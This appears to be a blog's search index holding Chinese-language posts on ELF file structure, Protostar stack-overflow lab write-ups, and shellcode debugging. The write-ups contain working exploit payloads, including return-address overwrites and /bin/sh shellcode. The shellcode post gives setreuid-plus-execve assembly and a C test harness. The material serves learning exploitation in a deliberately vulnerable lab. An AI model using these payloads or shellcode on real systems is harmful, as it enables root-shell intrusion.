<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ELF File Structure]]></title>
    <url>%2F2017%2F10%2F17%2FELF-file-structure%2F</url>
    <content type="text"><![CDATA[OVERVIEW下图定性地描述了ELF文件的总体结构(以32位系统为例), 下文中将详细展开图中的每一项. ELF Header可用readelf -h查看ELF Header信息. ELF文件的魔数为0x7F454C46, 即\x7fELF ###32 bit 12345678910111213141516typedef struct elf32_hdr &#123; unsigned char e_ident[EI_NIDENT]; Elf32_Half e_type; Elf32_Half e_machine; Elf32_Word e_version; Elf32_Addr e_entry; /* Entry point */ Elf32_Off e_phoff; Elf32_Off e_shoff; Elf32_Word e_flags; Elf32_Half e_ehsize; Elf32_Half e_phentsize; Elf32_Half e_phnum; Elf32_Half e_shentsize; Elf32_Half e_shnum; Elf32_Half e_shstrndx;&#125; Elf32_Ehdr; 64 bit12345678910111213141516typedef struct elf64_hdr &#123; unsigned char e_ident[16]; /* ELF "magic number" */ Elf64_Half e_type; Elf64_Half e_machine; Elf64_Word e_version; Elf64_Addr e_entry; /* Entry point virtual address */ Elf64_Off e_phoff; /* Program header table file offset */ Elf64_Off e_shoff; /* Section header table file offset */ Elf64_Word e_flags; Elf64_Half e_ehsize; Elf64_Half e_phentsize; Elf64_Half e_phnum; Elf64_Half e_shentsize; Elf64_Half e_shnum; Elf64_Half e_shstrndx;&#125; Elf64_Ehdr; member member usage e_ident magic &amp; class &amp; data &amp; verison &amp; OS/ABI &amp; ABI version e_type ELF文件类型 e_machine ELF文件的CPU平台属性 e_version ELF版本 e_entry ELF程序的入口虚拟地址 e_phoff e_shoff 段表在文件中的偏移量 e_word ELF标志位 e_ehsize ELF文件头大小 e_phentsize e_phnum e_shentsize 段表描述符大小 e_shnum 段表描述符数量, 即段的数量 e_shsrendx 段表字符串表所在的段在段表中的下标 Section Header Table可用readelf -S查看段表. 32 bit123456789101112typedef struct elf32_shdr &#123; Elf32_Word sh_name; Elf32_Word sh_type; Elf32_Word sh_flags; Elf32_Addr sh_addr; Elf32_Off sh_offset; Elf32_Word sh_size; Elf32_Word sh_link; Elf32_Word sh_info; Elf32_Word sh_addralign; Elf32_Word sh_entsize;&#125; Elf32_Shdr; 64 bit123456789101112typedef struct elf64_shdr &#123; Elf64_Word sh_name; /* Section name, index in string tbl */ Elf64_Word sh_type; /* Type of section */ Elf64_Xword sh_flags; /* Miscellaneous section attributes */ Elf64_Addr sh_addr; /* Section virtual addr at execution */ Elf64_Off sh_offset; /* Section file offset */ Elf64_Xword sh_size; /* Size of section in bytes */ Elf64_Word sh_link; /* Index of another section */ Elf64_Word sh_info; /* Additional section information */ Elf64_Xword sh_addralign; /* Section alignment */ Elf64_Xword sh_entsize; /* Entry size if section holds table */&#125; Elf64_Shdr; member member usage sh_name 段名字符串在.shstrtab字符串表中的偏移 sh_type 段的类型 sh_flags 段的标志位 sh_addr 段被加载后在进程空间的虚拟地址 sh_offset 段在文件中的偏移 sh_size 段的长度 sh_link &amp; sh_info 段的链接信息 sh_addralign 段地址对齐, 为2的n次. 若为0或1, 说明该段没有对齐要求 sh_entisze 项的长度 sh_type : 段类型123456789101112131415161718/* sh_type */#define SHT_NULL 0 //无效段#define SHT_PROGBITS 1 //程序段, 如代码段/数据段#define SHT_SYMTAB 2 //符号表#define SHT_STRTAB 3 //字符串表#define SHT_RELA 4 //重定位表#define SHT_HASH 5 //符号表的哈希表#define SHT_DYNAMIC 6 //动态链接信息#define SHT_NOTE 7 //提示性信息#define SHT_NOBITS 8 //表示该段在文件中没有内容#define SHT_REL 9 //包含重定位信息#define SHT_SHLIB 10 //保留#define SHT_DYNSYM 11 //动态链接的符号表#define SHT_NUM 12#define SHT_LOPROC 0x70000000#define SHT_HIPROC 0x7fffffff#define SHT_LOUSER 0x80000000#define SHT_HIUSER 0xffffffff sh_flag : 段标志位12345/* sh_flags */#define SHF_WRITE 0x1 //表示该段在进程空间可写#define SHF_ALLOC 0x2 //该段在进程空间中需要分配空间#define SHF_EXECINSTR 0x4 //该段在进程空间中可执行, 一般指代码段#define SHF_MASKPROC 0xf0000000 Symbol Table可以用readelf -s查看符号表信息. 32 bit12345678typedef struct elf32_sym&#123; Elf32_Word st_name; Elf32_Addr st_value; Elf32_Word st_size; unsigned char st_info; unsigned char st_other; Elf32_Half st_shndx;&#125; Elf32_Sym; 64 bit12345678typedef struct elf64_sym &#123; Elf64_Word st_name; /* Symbol name, index in string tbl */ unsigned char st_info; /* Type and binding attributes */ unsigned char st_other; /* No defined meaning, 0 */ Elf64_Half st_shndx; /* Associated section index */ Elf64_Addr st_value; /* Value of the symbol */ Elf64_Xword st_size; /* Associated symbol size */&#125; Elf64_Sym; member usage st_name 符号名, 即该符号名在字符串表中的下标 st_value 符号相对应的值(目标文件:符号在段中的偏移, 可执行文件: 符号虚拟地址) st_size 符号大小(占用空间) st_info 符号类型和绑定信息 st_other 为0, 无用 st_shndx 该符号所在的段 st_info : 符号类型及绑定信息123456789101112/* This info is needed when parsing the symbol table */#define STB_LOCAL 0 // 局部符号#define STB_GLOBAL 1 //全局符号#define STB_WEAK 2 //弱引用#define STT_NOTYPE 0 //未知类型#define STT_OBJECT 1 //数据对象#define STT_FUNC 2 //函数#define STT_SECTION 3 //段, 这种类型的符号必须是STB_LOCAL的#define STT_FILE 4 //文件名, STB_LOCAL并且st_shndx是SHN_ABS#define STT_COMMON 5#define STT_TLS 6 st_shndx : 符号所在段若符号定义在本目标文件中, 那么st_shndx表示符号所在段在段表中的下标. 对于一些特殊符号, st_shndx有特殊的值. 12345678/* special section indexes */#define SHN_UNDEF 0 //符号定义在其他文件中#define SHN_LORESERVE 0xff00#define SHN_LOPROC 0xff00#define SHN_HIPROC 0xff1f#define SHN_ABS 0xfff1 //该符号包含一个绝对值#define SHN_COMMON 0xfff2 //该符号是一个COMMON块#define SHN_HIRESERVE 0xffff]]></content>
      <categories>
        <category>Linux kernel</category>
      </categories>
      <tags>
        <tag>ELF</tag>
        <tag>link&amp;load</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Protostar Stack Still Easy]]></title>
    <url>%2F2017%2F09%2F08%2Fprotostar-stack-still-easy%2F</url>
    <content type="text"><![CDATA[接上次protostar stack easy, 这篇文章是stack5-stack7的write-up, 因为给汇编代码写注释太费时间, 我就直接上源码了. stack5将shellcode写到栈上, 然后JMP到shellcode的起始地址. ‘0x90’是NOP指令的机器码, 加入适当的’0x90’是提高JMP进shellcode的几率, 在这个题目中加或不加都没有关系, 因为没有开启ASLR. 这种技巧在heap spray中也会用到. exp123456789sc = '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'payroad = ''payroad += 'A' * 0x4cpayroad += '\xb0\xfc\xff\xbf'#payroad += '\x90' * 0x20payroad += scprint payroad stack6先看源码中的这几句 :123456ret = __builtin_return_address(0);if((ret &amp; 0xbf000000) == 0xbf000000) &#123; printf("bzzzt (%p)\n", ret); _exit(1);&#125; __builtin_return_address函数返回当前函数或调用当前函数的指令的返回地址. 参数为0表示返回当前函数的地址. if语句限制了返回地址第一个字节不能等于0xbf, 也就是说, 返回地址不能在栈上.12345678910(gdb) info proc mappingsprocess 4407cmdline = &apos;/opt/protostar/bin/stack6&apos;cwd = &apos;/opt/protostar/bin&apos;exe = &apos;/opt/protostar/bin/stack6&apos;Mapped address spaces: Start Addr End Addr Size Offset objfile ... ... 0xbffeb000 0xc0000000 0x15000 0 [stack] exp这道题目可以用ret2libc做, 但是这里我们用另外一种方法.1234567891011sc = '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'retaddr = '\xf9\x84\x04\x08' # retpayroad = ''payroad += 'A' * 0x50payroad += retaddrpayroad += '\x94\xfc\xff\xbf'#payroad += '\x90' * 0x20payroad += scprint payroad 这里我们通过ret两次来绕过检查, 第一次返回到ret指令, 第二次返回到shellcode首地址. stack7先看源码:123456789ret = __builtin_return_address(0); if((ret &amp; 0xb0000000) == 0xb0000000) &#123; printf("bzzzt (%p)\n", ret); _exit(1); &#125; printf("got path %s\n", buffer); return strdup(buffer); 参照stack6, 前两句限制了ret2libc和直接JMP shellcode. 我们仍然可以用返回到.text段的方法. 这里有一点很奇怪, 当我在gdb里面调试的时候是能够成功getshell的, 但是直接执行程序的时候会报错Illegal instruction.这里可能的原因是gdb中调试的地址和实际运行的地址不同.具体参照Here, 可以通过生成core文件来查看地址.这道题特殊的解法是JMP register, 因为strdup返回的地址被保存在eax中, 我们也可以利用这一点来JMP到shellcode, 具体实现见Here.]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>stack overflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Debug Shellcode]]></title>
    <url>%2F2017%2F09%2F05%2FDebug-Shellcode%2F</url>
    <content type="text"><![CDATA[记录几个自己碰到的关于shellcode的问题, 一个都没解决…如果有知道解决方法的请发我邮箱(邮箱在页面最下方), 谢谢! shellcode 1最简单的shellcode形式大概就是直接调用execve(“/bin/sh”, {“/bin/sh”, NULL}, NULL)系统调用了吧…并不是十分清楚, 所以如果说错的话就当我没说… C code先从C代码开始: 123456#include &lt;stdlib.h&gt;main()&#123; char *argv[] = &#123;"bin/sh", NULL&#125;; setuid(0, 0); execve("/bin/sh", argv, NULL);&#125; 编译运行以上程序, 我们就能够得到一个shell了. asm code 按照上面的思路, 转成汇编代码: 123456789101112131415161718192021section .textglobal _start_start: ;setreuid(0, 0) xor eax, eax xor ebx, ebx ;ruid = 0 xor ecx, ecx ;euid = 0 mov al,0x46 ;sys_setreuid int 0x80 ;execve(&quot;/bin//sh&quot;, argv, NULL) xor eax, eax push eax ;NULL, 字符串截断符 ;&quot;//sh&quot;, 第二个&apos;/&apos;是为了填充字节, 在命令行输入/bin//sh是可以执行成功的 push 0x68732f2f push 0x6e69622f ;&quot;/bin&quot; mov ebx, esp push eax ;NULL, 设置argv[1]为空 push ebx mov ecx, esp mov al, 0x0b ;sys_execve int 0x80 具体栈内数据如下:1234567891011low--&gt; ++++++++++++++ + argv + &lt;-- argv = sh_addr(addr of &apos;/bin//sh&apos;) ++++++++++++++ + 0 + &lt;-- argv [1]sh_addr ++++++++++++++ + /bin + ++++++++++++++ + //sh + ++++++++++++++ + 0 +high--&gt; ++++++++++++++ 编译运行以后就能够成功拿到shell了, 然后用objdump反汇编, 就可以得到shellcode. 这段代码出自《Grey Hat Hacking》一书, 我尝试着想把它改成下面的形式, 但是程序报错Address boundary error. 后面发现原因: argv是一个指针数组, 如果要把它写到.data段中, 就需要知道argv在data中的具体地址. 这种做法是不可取的, 因为.data段的地址不是固定的. 但是, 如果要想用这种db &quot;/bin/sh&quot;形式, 也还是办法的. 具体见下面的shellcode2. 12section .datashell db &apos;/bin//sh&apos;, 0 shellcode test&amp;debug一种常见的测试shellcode是否可用的方法是: 12345678910111213141516171819202122/*char sc[] = your_shellcode;*/char sc[] = "\x31\xc0" //xor eax,eax "\x31\xdb" //xor ebx,ebx "\x31\xc9" //xor ecx,ecx "\xb0\x46" //mov al,0x46 "\xcd\x80" //int 0x80 "\x31\xc0" //xor eax,eax "\x50" //push eax "\x68\x2f\x2f\x73\x68" //push 0x68732f2f "\x68\x2f\x62\x69\x6e" //push 0x6e69622f "\x89\xe3" //mov ebx,esp "\x50" //push eax "\x53" //push ebx "\x89\xe1" //mov ecx,esp "\xb0\x0b" //mov al,0xb "\xcd\x80" //int 0x80main()&#123; void (*fp)(void); fp = (void *) sc; fp();&#125; 用以上的方法对上述shellcode测试, 发现报SIGSEGV(Address boundary error)的错……用gdb调试, 发现了这样的结果, 一路下来程序执行的非常顺利, 栈上的数据也没有什么问题, 但是调用最后一个0x80的时候并没有getshell, 继续单步执行反而报了segment fault的错. 我是在protostar虚拟机里面测试的这段shellcode, 在ubuntu下好像被什么神秘的保护机制给挡住了…连shellcode起始地址都不跳进去就报错…好了, 虽然没有调试成功这段shellcode, 但就当作我已经测试成功了…接下来继续看下一段shellcode. shellcode2这段shellcode的原出处在Here. 它的设计思路和shellcode1一样. asm code1234567891011121314151617181920212223242526;shellex.asm[SECTION .text]global _start_start: xor eax, eax mov al, 70 ;setreuid is syscall 70 xor ebx, ebx xor ecx, ecx int 0x80 jmp short ender starter: pop ebx ;get the address of the string xor eax, eax mov [ebx+7], al ;put a NULL where the N is in the string mov [ebx+8], ebx ;put the address of the string to where the ;AAAA is mov [ebx+12], eax ;put 4 null bytes into where the BBBB is mov al, 11 ;execve is syscall 11 lea ecx, [ebx+8] ;load the address of where the AAAA was lea edx, [ebx+12] ;load the address of the NULLS int 0x80 ;call the kernel, WE HAVE A SHELL! ender: call starter db &apos;/bin/shNAAAABBBB&apos; 整个代码的逻辑感觉没有什么问题, 但是依然报错, 而且这次是运行可执行文件的时候就报错.报错情况如下: 可以看到程序是没有开任何保护机制的, 不知道又是哪股神秘的力量阻挡了shellcode的执行… summary可能是因为我给的两段shellcode的例子都比较老了, 所以问题才这么多吧. 不过我的确是在做PWN题目时候碰到过已经JMP进shellcode, 还报Segment Fault的错(那段shellcode是用gef工具生成的). 感觉shellcode真是一个神秘的东西. refrence 《Grey hat hacking》 Shellcoding for Linux and Windows Tutorial]]></content>
      <categories>
        <category>RE note</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
        <tag>pwn</tag>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Protostar Stack Easy]]></title>
    <url>%2F2017%2F09%2F04%2Fprotostar-stack-easy%2F</url>
    <content type="text"><![CDATA[这是给exploit-exercises上protostar的stack题目写的write-up. 由于篇幅限制, 这篇文章只有stack0 - stack4的write-up. stack0首先看一下汇编代码 : 123456789101112131415161718192021222324(gdb) disas mainDump of assembler code for function main:0x080483f4 &lt;main+0&gt;: push ebp0x080483f5 &lt;main+1&gt;: mov ebp,esp0x080483f7 &lt;main+3&gt;: and esp,0xfffffff00x080483fa &lt;main+6&gt;: sub esp,0x60;first pramater modified0x080483fd &lt;main+9&gt;: mov DWORD PTR [esp+0x5c],0x00x08048405 &lt;main+17&gt;: lea eax,[esp+0x1c] ;buf0x08048409 &lt;main+21&gt;: mov DWORD PTR [esp],eax0x0804840c &lt;main+24&gt;: call 0x804830c &lt;gets@plt&gt; ;gets(buf)0x08048411 &lt;main+29&gt;: mov eax,DWORD PTR [esp+0x5c]0x08048415 &lt;main+33&gt;: test eax,eax ;if (flag == 0)?0x08048417 &lt;main+35&gt;: je 0x8048427 &lt;main+51&gt;;puts($0x8048500) if (modified != 0)0x08048419 &lt;main+37&gt;: mov DWORD PTR [esp],0x80485000x08048420 &lt;main+44&gt;: call 0x804832c &lt;puts@plt&gt; 0x08048425 &lt;main+49&gt;: jmp 0x8048433 &lt;main+63&gt;;puts($0x8048500) if (modified == 0)0x08048427 &lt;main+51&gt;: mov DWORD PTR [esp],0x80485290x0804842e &lt;main+58&gt;: call 0x804832c &lt;puts@plt&gt;0x08048433 &lt;main+63&gt;: leave 0x08048434 &lt;main+64&gt;: ret End of assembler dump. 上述代码中, 注释为笔者所加. 下面看一下0x8048500和0x8048529两个字符串的具体内容: 1234(gdb) x/s 0x80485000x8048500: &quot;you have changed the &apos;modified&apos; variable&quot;(gdb) x/s 0x80485290x8048529: &quot;Try again?&quot; 到此, 这个程序的逻辑就已经理清了. 该程序调用gets()函数读取用户输入, 并写入到buf[0x40]中. 由于程序不检查输入, 此处可以发生字符串溢出. 当modified值被修改后输出”you have changed the ‘modified’ variable”, 否则输出”Try again?”. stack0程序的源代码在Here. 我们只要输入超过0x40个字符就能够获取到正确输入. solve1python -c "print 'A'*0x40 + 'modified'" | ./stack0 stack1照样先看汇编代码: 123456789101112131415161718192021222324252627282930313233343536373839404142(gdb) disas mainDump of assembler code for function main:;modified = [esp+0x5c] ;size=0x4;buf = [esp+0x1c] ;size=0x40;argv1 = [esp+0x4]0x08048464 &lt;main+0&gt;: push ebp0x08048465 &lt;main+1&gt;: mov ebp,esp0x08048467 &lt;main+3&gt;: and esp,0xfffffff00x0804846a &lt;main+6&gt;: sub esp,0x60;if argc == 1?0x0804846d &lt;main+9&gt;: cmp DWORD PTR [ebp+0x8],0x10x08048471 &lt;main+13&gt;: jne 0x8048487 &lt;main+35&gt;;call errx(1, $0x80485a0) if (argc == 1)0x08048473 &lt;main+15&gt;: mov DWORD PTR [esp+0x4],0x80485a00x0804847b &lt;main+23&gt;: mov DWORD PTR [esp],0x10x08048482 &lt;main+30&gt;: call 0x8048388 &lt;errx@plt&gt;0x08048487 &lt;main+35&gt;: mov DWORD PTR [esp+0x5c],0x0;argv1 = &amp;argv[1], strcpy(buf, argv1)0x0804848f &lt;main+43&gt;: mov eax,DWORD PTR [ebp+0xc]0x08048492 &lt;main+46&gt;: add eax,0x40x08048495 &lt;main+49&gt;: mov eax,DWORD PTR [eax]0x08048497 &lt;main+51&gt;: mov DWORD PTR [esp+0x4],eax0x0804849b &lt;main+55&gt;: lea eax,[esp+0x1c]0x0804849f &lt;main+59&gt;: mov DWORD PTR [esp],eax0x080484a2 &lt;main+62&gt;: call 0x8048368 &lt;strcpy@plt&gt;;if (modified == &apos;abcd&apos;)?0x080484a7 &lt;main+67&gt;: mov eax,DWORD PTR [esp+0x5c]0x080484ab &lt;main+71&gt;: cmp eax,0x616263640x080484b0 &lt;main+76&gt;: jne 0x80484c0 &lt;main+92&gt;;puts($0x80485bc) and leave if (modified == &apos;abcd&apos;)0x080484b2 &lt;main+78&gt;: mov DWORD PTR [esp],0x80485bc0x080484b9 &lt;main+85&gt;: call 0x8048398 &lt;puts@plt&gt;0x080484be &lt;main+90&gt;: jmp 0x80484d5 &lt;main+113&gt;;printf($0x80485f3, argv1) if (modified != &apos;abcd&apos;)0x080484c0 &lt;main+92&gt;: mov edx,DWORD PTR [esp+0x5c]0x080484c4 &lt;main+96&gt;: mov eax,0x80485f30x080484c9 &lt;main+101&gt;: mov DWORD PTR [esp+0x4],edx0x080484cd &lt;main+105&gt;: mov DWORD PTR [esp],eax0x080484d0 &lt;main+108&gt;: call 0x8048378 &lt;printf@plt&gt;0x080484d5 &lt;main+113&gt;: leave 0x080484d6 &lt;main+114&gt;: ret End of assembler dump. 继续看一下各个字符串的值分别为多少: 123456(gdb) x/s 0x80485f30x80485f3: &quot;Try again, you got 0x%08x\n&quot;(gdb) x/s 0x80485bc0x80485bc: &quot;you have correctly got the variable to the right value&quot;(gdb) x/s 0x80485a00x80485a0: &quot;please specify an argument\n&quot; 该程序首先检查argc是否为1, 若是, 则程序报错. 然后执行strcpy(buf, argv[1]), 如果modified被覆写为”abcd”, 则输出you have correctly got the variable to the right value, 否则视为失败. stack1的源码在Here. solve1python -c "print 'A'*0x40 + 'abcd'" | ./stack1 stack2执行程序,得到以下结果: 1234root@protostar:/opt/protostar/bin# ./stack2stack2: please set the GREENIE environment variableroot@protostar:/opt/protostar/bin# 可以看到, 这个程序要求我们设置GREENIE的环境变量. 那么在这里, 我们就需要用到execve()系统调用, 这道题的exp可以用python写, 也可以用C写, 我用的是python. 其实用C和python代码基本相同, 除了在C中环境变量是由”$ENV_NAME=ENV_VALUE”的指针数组表示, 而在python里, 环境变量的类型是字典. 继续上汇编代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445(gdb) disas mainDump of assembler code for function main:;env_greenie = [esp+0x5c] ;size = 0x4;modified = [esp+0x58] ;size = 0x4;buf = [esp+0x18] ;size = 0x400x08048494 &lt;main+0&gt;: push ebp0x08048495 &lt;main+1&gt;: mov ebp,esp0x08048497 &lt;main+3&gt;: and esp,0xfffffff00x0804849a &lt;main+6&gt;: sub esp,0x60;env_greenie = getenv(&quot;GREENIE&quot;)0x0804849d &lt;main+9&gt;: mov DWORD PTR [esp],0x80485e00x080484a4 &lt;main+16&gt;: call 0x804837c &lt;getenv@plt&gt;0x080484a9 &lt;main+21&gt;: mov DWORD PTR [esp+0x5c],eax;if (env_greenie == 0)?0x080484ad &lt;main+25&gt;: cmp DWORD PTR [esp+0x5c],0x00x080484b2 &lt;main+30&gt;: jne 0x80484c8 &lt;main+52&gt;;errx(1, &quot;GREENIE&quot;) if (env_greenie == 0)0x080484b4 &lt;main+32&gt;: mov DWORD PTR [esp+0x4],0x80485e80x080484bc &lt;main+40&gt;: mov DWORD PTR [esp],0x10x080484c3 &lt;main+47&gt;: call 0x80483bc &lt;errx@plt&gt;;if (env_greenie != 0)&#123;0x080484c8 &lt;main+52&gt;: mov DWORD PTR [esp+0x58],0x0 ;modified = 0;strcpy(buf, env_greenie) &#125;0x080484d0 &lt;main+60&gt;: mov eax,DWORD PTR [esp+0x5c]0x080484d4 &lt;main+64&gt;: mov DWORD PTR [esp+0x4],eax0x080484d8 &lt;main+68&gt;: lea eax,[esp+0x18]0x080484dc &lt;main+72&gt;: mov DWORD PTR [esp],eax0x080484df &lt;main+75&gt;: call 0x804839c &lt;strcpy@plt&gt;;if (modified = 0x8048618)?0x080484e4 &lt;main+80&gt;: mov eax,DWORD PTR [esp+0x58]0x080484e8 &lt;main+84&gt;: cmp eax,0xd0a0d0a0x080484ed &lt;main+89&gt;: jne 0x80484fd &lt;main+105&gt;;puts($0x8048618) and leave if (modified == 0xd0a0d0a)0x080484ef &lt;main+91&gt;: mov DWORD PTR [esp],0x80486180x080484f6 &lt;main+98&gt;: call 0x80483cc &lt;puts@plt&gt;0x080484fb &lt;main+103&gt;: jmp 0x8048512 &lt;main+126&gt;;printf($0x8048641, midified) if (modified != 0xd0a0d0a)0x080484fd &lt;main+105&gt;: mov edx,DWORD PTR [esp+0x58]0x08048501 &lt;main+109&gt;: mov eax,0x80486410x08048506 &lt;main+114&gt;: mov DWORD PTR [esp+0x4],edx0x0804850a &lt;main+118&gt;: mov DWORD PTR [esp],eax0x0804850d &lt;main+121&gt;: call 0x80483ac &lt;printf@plt&gt;0x08048512 &lt;main+126&gt;: leave 0x08048513 &lt;main+127&gt;: ret End of assembler dump. ​ 各个字符串的值分别如下: 123450x80485e0: &quot;GREENIE&quot;(gdb) x/s0x80485e8: &quot;please set the GREENIE environment variable\n&quot;(gdb) x/s 0x80486180x8048618: &quot;you have correctly modified the variable&quot; ​ 整个程序的流程就是调用strcpy将env_greenie的值复制给buf, 如果midified的值被覆盖, 则输出”you have correctly modified the variable”, 否则视为失败. ​ stack2的源码在Here. solve.py​ 下面是用python写的exp, 由于小端的存取顺序0x0d0a0d0a需要倒过来写: 1234import osenv_greenie = 'A'*0x40 + '\x0a\x0d\x0a\x0d'envp = &#123;"GREENIE": str(env_greenie)&#125;os.execve("./stack2", ["./stack2"], envp) stack3还是先上汇编代码, 下面这段是main函数的汇编代码: 123456789101112131415161718192021222324252627282930(gdb) disas mainDump of assembler code for function main:;midified = [esp+0x5c];buf = [esp+0x1c]0x08048438 &lt;main+0&gt;: push ebp0x08048439 &lt;main+1&gt;: mov ebp,esp0x0804843b &lt;main+3&gt;: and esp,0xfffffff00x0804843e &lt;main+6&gt;: sub esp,0x600x08048441 &lt;main+9&gt;: mov DWORD PTR [esp+0x5c],0x0 ;midified = 0;gets(buf)0x08048449 &lt;main+17&gt;: lea eax,[esp+0x1c]0x0804844d &lt;main+21&gt;: mov DWORD PTR [esp],eax0x08048450 &lt;main+24&gt;: call 0x8048330 &lt;gets@plt&gt;;if (modified == 0)?0x08048455 &lt;main+29&gt;: cmp DWORD PTR [esp+0x5c],0x0;leave if if (modified == 0)0x0804845a &lt;main+34&gt;: je 0x8048477 &lt;main+63&gt;;if (modified != 0)&#123;;printf($0x8048560, midified)0x0804845c &lt;main+36&gt;: mov eax,0x80485600x08048461 &lt;main+41&gt;: mov edx,DWORD PTR [esp+0x5c]0x08048465 &lt;main+45&gt;: mov DWORD PTR [esp+0x4],edx0x08048469 &lt;main+49&gt;: mov DWORD PTR [esp],eax0x0804846c &lt;main+52&gt;: call 0x8048350 &lt;printf@plt&gt;;call(modified) &#125;0x08048471 &lt;main+57&gt;: mov eax,DWORD PTR [esp+0x5c]0x08048475 &lt;main+61&gt;: call eax0x08048477 &lt;main+63&gt;: leave 0x08048478 &lt;main+64&gt;: ret End of assembler dump. 字符串的值如下: 12(gdb) x/s 0x80485600x8048560: &quot;calling function pointer, jumping to 0x%08x\n&quot; 可以看到, 若modified被覆盖, 函数将跳转midified, 我们只要把modified覆盖成我们想要跳转的地址即可. 查看程序的C源码, 可以看到源码中定义了一个win()函数. 12(gdb) info addr winSymbol &quot;win&quot; is a function at address 0x8048424. 所以0x8048424就是我们要跳转的地址. stack2的源码在Here. solve1python -c "print 'A'*0x40 + '\x24\x84\x04\x08'" | ./stack3 stack4这道题的代码有点短, 代码如下: 12345678910111213Dump of assembler code for function main:;buf = [esp+0x10] ;size = 0x400x08048408 &lt;main+0&gt;: push ebp0x08048409 &lt;main+1&gt;: mov ebp,esp0x0804840b &lt;main+3&gt;: and esp,0xfffffff00x0804840e &lt;main+6&gt;: sub esp,0x50;gets(buf)0x08048411 &lt;main+9&gt;: lea eax,[esp+0x10]0x08048415 &lt;main+13&gt;: mov DWORD PTR [esp],eax0x08048418 &lt;main+16&gt;: call 0x804830c &lt;gets@plt&gt;0x0804841d &lt;main+21&gt;: leave 0x0804841e &lt;main+22&gt;: ret End of assembler dump. 该程序调用gets函数读取用户输入, 然后退出. 我们可以覆写函数的返回地址, 让函数返回到win函数的入口地址. 用gdb查看win函数的地址为0x80483f4, 调试程序, 查看buf的地址离要覆盖的地址之间的偏移. buf的起始地址在$esp+0x10 == 0xbffffc50. retaddr的地址为$ebp+0x4 == 0xbffffc9c, 偏移为0x4c. 1234(gdb) x/x $esp+0x100xbffffc50: 0xb7fd7ff4(gdb) x/x $ebp+0x40xbffffc9c: 0xb7eadc76 solve1python -c "print 'A'*0x4c + '\xf4\x83\x04\x08'" | ./stack4 运行上面这行命令以后, 我们会得到”code flow successfully changed”的输出和一个Segmentation fault的提示, 这是正常的, 因为我们覆盖了main函数的返回地址使得程序无法正常退出了. summary以上的五道题目都是非常简单的栈溢出题, 程序没有设置任何保护机制, 也不需要用到什么技巧就能够破解. 有一点要注明的是, 上面的代码块中有些语法为shell的代码块我写了python, 因为Hexo默认不支持shell, 也不支持汇编…]]></content>
      <categories>
        <category>write-up</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>stack overflow</tag>
      </tags>
  </entry>
</search>
